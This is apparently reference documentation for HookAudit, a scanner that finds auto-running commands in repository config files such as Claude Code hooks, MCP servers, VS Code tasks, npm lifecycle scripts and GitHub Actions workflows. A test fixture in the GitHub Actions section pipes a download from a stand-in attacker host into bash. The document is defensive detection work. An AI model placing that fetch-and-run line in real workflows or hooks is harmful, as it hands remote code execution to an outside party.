# Reference — Execution Surfaces

Complete, accurate list of every ecosystem adapter HookAudit normalizes. Sourced from `bin/hookaudit.js:63 SURFACES`, `bin/hookaudit.js:382 extractClaudeHookCommands`, `bin/hookaudit.js:405 extractVscodeTaskCommands`, `bin/hookaudit.js:418 extractPackageJsonScripts`, `bin/hookaudit.js:554 parseGithubTriggers`, and `test/fixtures/*`.

## Surface table

| ID | Globs (relative to repo root) | Kind | Describe | Trigger type | Command source | Evidence `field` |
|----|-------------------------------|------|----------|--------------|---------------|------------------|
| `claude-settings` | `.claude/settings.json`, `.claude/settings.local.json` | `json` | Claude Code project hook configuration | `SessionStart`, `PreToolUse`, `PostToolUse`, `UserPromptSubmit` (from `hooks.<trigger>[i].hooks[j].command`) | `hooks.<trigger>[i].hooks[j].command` (`command` or `cmd`) | `hooks.SessionStart[0].hooks[0].command` |
| `claude-mcp` | `.mcp.json`, `.claude/mcp.json` | `json` | MCP server launch configuration read by Claude Code | `mcp:<server>` auto | `mcpServers.<name>.command + args[]` | `mcpServers.<name>.command` |
| `vscode-tasks` | `.vscode/tasks.json` | `json` | VS Code task configuration (can auto-run) | `folderOpen` (auto) vs label (manual) | `command + args[]` | `tasks[i].command` |
| `vscode-settings` | `.vscode/settings.json` | `json` | VS Code workspace settings (can enable auto-run) | heuristic | whole-file sweep (text) | `null` (file-body) |
| `cursor-rules` | `.cursorrules`, `.cursor/rules` | `text-dir-or-file` | Cursor agent rule files | `text` heuristic | raw text | `null` |
| `gemini-settings` | `.gemini/settings.json` | `json` | Gemini CLI project hook configuration | heuristic | whole-file sweep | `null` |
| `codex-config` | `.codex/config.toml` | `text` | Codex CLI configuration | heuristic | raw text (no TOML AST) | `null` |
| `package-lifecycle` | `package.json` | `json` | npm lifecycle scripts | `preinstall`, `install`, `postinstall`, `prepare`, `prepublish`, `prepublishOnly` auto | `scripts.<name>` | `scripts.postinstall` |
| `husky-hooks` | `.husky` | `text-dir` | Husky-managed git hook scripts | git hook auto | file content | `null` |
| `git-hooks` | `.git/hooks` | `text-dir` | Local git hook scripts (excluding `*.sample`) | git hook auto | file content | `null` |
| `precommit-config` | `.pre-commit-config.yaml`, `.pre-commit-config.yml` | `text` | pre-commit framework | heuristic | raw text (no YAML AST) | `null` |
| `github-workflows` | `.github/workflows` | `yaml-dir` | GitHub Actions workflows — heuristic raw-text YAML | `push`, `pull_request` (auto), `workflow_dispatch`, `schedule` (auto), `workflow_call`, `repository_dispatch` → `trigger = <on-triggers>:<job>` | `jobs.<job>.steps[i].run` (block `|`, inline, fallback `run:` regex) | `jobs.<name>.steps[0].run` |

12 surfaces. Discovery walks `resolveSurfaceFiles` (`listFilesRecursive` sorted) for each glob via `path.join(root, rel)` + `lstat` check. `IGNORED_DIRS = {node_modules, .git, dist, build, .hookaudit}` — never bulk-walks `node_modules` or `.git` objects. `.git/hooks` walked separately; `*.sample` ignored. `.github/workflows` only includes `.yml/.yaml` files.

## Adapter contracts

Every adapter conceptually implements:

```text
canHandle(path, content) → bool
parse(path, content) → { triggers[], commands[] }
normalize(parsed) → ExecutionSurface[]
```

Adapters must not contain risk scoring, terminal formatting, or baseline logic — they only answer *what execution surface does this ecosystem define?* (`docs/spec` §38, `RULES.md` §8).

### Claude adapter (`bin/hookaudit.js:382`)

- Input: valid JSON.
- Scans `json.hooks`: `Object.entries(hooks)` → `list[i].hooks[j].command` (`command` or `cmd`).
- Emits `trigger = <hookEvent>` (e.g., `SessionStart`), `field = hooks.<event>[i].hooks[j].command`.
- Auto hints: `SessionStart`, `PreToolUse`, `PostToolUse`, `UserPromptSubmit` are auto (`AUTO_TRIGGER_KEYS`).

Example:

```json
{
  "hooks": {
    "SessionStart": [{ "hooks": [{ "type": "command", "command": "node scripts/bootstrap.mjs" }] }],
    "PreToolUse": [{ "hooks": [{ "command": "bash scripts/check.sh" }] }]
  }
}
```

### MCP adapter (`bin/hookaudit.js:660`)

- Reads `json.mcpServers` or `json.servers`.
- For each `name: { command, args[] }` → `trigger = mcp:<name>` (auto), `command = command + args.join(" ")`.

Example:

```json
{ "mcpServers": { "my-server": { "command": "node", "args": ["server.js"] } } }
```

### VS Code adapter (`bin/hookaudit.js:405`)

- `tasks = json.tasks[]`.
- `runOn = task.runOptions.runOn`; `auto = runOn === 'folderOpen'`.
- `command = [task.command, ...task.args].join(" ")`.
- `trigger = auto ? "folderOpen" : task.label || "task"`.

Example:

```json
{
  "version": "2.0.0",
  "tasks": [
    { "label": "Setup", "type": "shell", "command": "bash scripts/helper.sh", "args": ["--cross",".claude/settings.json"], "runOptions": { "runOn": "folderOpen" } }
  ]
}
```

### npm adapter (`bin/hookaudit.js:418`)

- `scripts = json.scripts`.
- `AUTO = { preinstall, install, postinstall, prepare, prepublish, prepublishOnly }`.
- `auto = AUTO.has(name)`.

Example:

```json
{ "scripts": { "postinstall": "node scripts/postinstall.js", "prepare": "husky install", "test": "jest" } }
```

`preinstall/install/postinstall/prepare` are auto — scored as automatic execution.

### Cursor / Gemini / Codex / pre-commit adapters

Heuristic text sweeps (no dedicated AST). They rely on whole-file defense-in-depth sweep (`evaluateCommand` on file body) catching `curl|fetch|eval` patterns even when structural extraction yields nothing. Suppressed when specific findings already cover the file’s capabilities to keep signal dense.

### GitHub Actions adapter (`bin/hookaudit.js:554`)

Heuristic raw-text YAML (no `js-yaml`). Trigger detection: `parseGithubTriggers` matches `^\s*on\s*:\s*(.*)$` first occurrence, slices 1200 chars, lowercases, regex-matches known triggers `push|pull_request|schedule|workflow_dispatch|workflow_call|repository_dispatch`; `isAutoWorkflow = some(push,pull_request,schedule)`. Command extraction: `extractGithubWorkflowCommands` walks `jobs:` → job name (`  <name>:`) → steps (`- run:` with `|/-` block). Handles block scalar `|` via 6-space indent scan, fallback global `run: |?\s*([^\n]+)` regex. `field` captures `jobs.<job>.steps[i].run`; `trigger` is `<workflowTriggers>:<job>` or `workflow`.

Fixture (`test/fixtures/github-actions-repo/.github/workflows/ci.yml`):

```yaml
on: { push: {} }
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -s https://example-attacker.test | bash
```

Yields `trigger: push:build`, `command: curl -s https://example-attacker.test | bash`, `auto: true`, `field: jobs.build.steps[0].run`.

## Normalized surface shape

Every finding normalizes toward (`bin/hookaudit.js:628 scanFile`):

```js
{
  file: "relative/posix/path",           // toPosix(path.relative(root, abs))
  surface: "claude-settings",             // SURFACES id
  hash: "sha256 hex or null",             // null if FILE_TOO_LARGE/BINARY_SKIPPED/SYMLINK_SKIPPED
  findings: [{
    trigger: "SessionStart",              // event / label / run
    command: "node scripts/bootstrap.mjs",
    commandSpec: {
      raw: "node scripts/bootstrap.mjs",
      executable: "node",
      args: ["node","scripts/bootstrap.mjs"],
      shell: false,                       // true if /[|&;`$<>]/.test(raw)
      references: ["scripts/bootstrap.mjs"],
      isDynamic: false                    // true if /\$\{|\$\(|`.*\$\{|process.env/…/
    },
    severity: "WARN",                     // INFO=0, WARN if score>=2, CRITICAL if score>=5
    score: 4,                             // 2 for auto + rule weights
    reasons: ["fires automatically on \"SessionStart\"…", "Command spawns a process…"],
    capabilities: ["PROCESS_EXECUTION"],
    reachableCapabilities: ["NETWORK_ACCESS","PROCESS_EXECUTION","REMOTE_DOWNLOAD"],
    pathRisk: "HIGH",                     // from computePathRisk (see reference-capabilities / reference-graph)
    confidence: "HIGH",                   // HIGH literal, MEDIUM resolved multi-hop, LOW dynamic
    evidence: [{ path, field, detector, reason, excerpt: command.slice(0,200) }],
    field: "hooks.SessionStart[0].hooks[0].command",
    sourcePath: ".claude/settings.json"
  }],
  parseError: null,                       // "invalid JSON" | "unreadable" | null
  diagnostics: [{ code: "INVALID_JSON", path, detail }],
  capabilities: ["PROCESS_EXECUTION"]     // union of finding capabilities, sorted
}
```

Unsupported/dynamic shapes are explicit: `confidence: LOW` + `capabilities: [DYNAMIC_EXECUTION]` + diagnostic `DYNAMIC_EXECUTION / UNRESOLVED_REFERENCE / PARTIALLY_RESOLVED`.

## Evidence model

Every meaningful detection retains `evidence` (`bin/hookaudit.js:355 createEvidence`):

```js
{ path: ".claude/settings.json",
  field: "hooks.SessionStart[0].hooks[0].command",  // field-accurate pointer
  detector: "process-exec",                          // RULE id or "cross-reference"/"dynamic"
  reason: "Command spawns a process or interpreter.",
  excerpt: "node scripts/bootstrap.mjs"              // capped at 200 chars
}
```

Graph edges add `evidence{path, field, excerpt, capability}` per edge.

## Examples: field pointers you will see

- `hooks.SessionStart[0].hooks[0].command` — Claude
- `hooks.PostToolUse[1].hooks[0].command`
- `mcpServers.my-server.command` — MCP
- `tasks[0].command` — VS Code
- `scripts.postinstall` — npm
- `jobs.build.steps[0].run` — GitHub Actions
- `null` (file-body sweep) — heuristic surfaces

## Discovery safety

- Paths sorted (`localeCompare`, `entries.sort`), deterministic across platforms.
- `MAX_FILE_SIZE=1 MiB` via `lstat.size` before `readFileSync` → `FILE_TOO_LARGE`.
- Binary heuristic via first 1 KiB non-printable ratio >30% or null byte → `BINARY_SKIPPED`.
- Symlink via `lstat.isSymbolicLink()` in discovery and resolver → `SYMLINK_SKIPPED`.
- Boundary via `resolveInsideRepository` central helper — see `docs/reference-graph.md`.

## Related

- `docs/reference-capabilities.md` — detectors that fire on these commands
- `docs/reference-graph.md` — how references are resolved to edges
- `docs/reference-cli.md` — how surfaces appear in JSON/SARIF/HTML
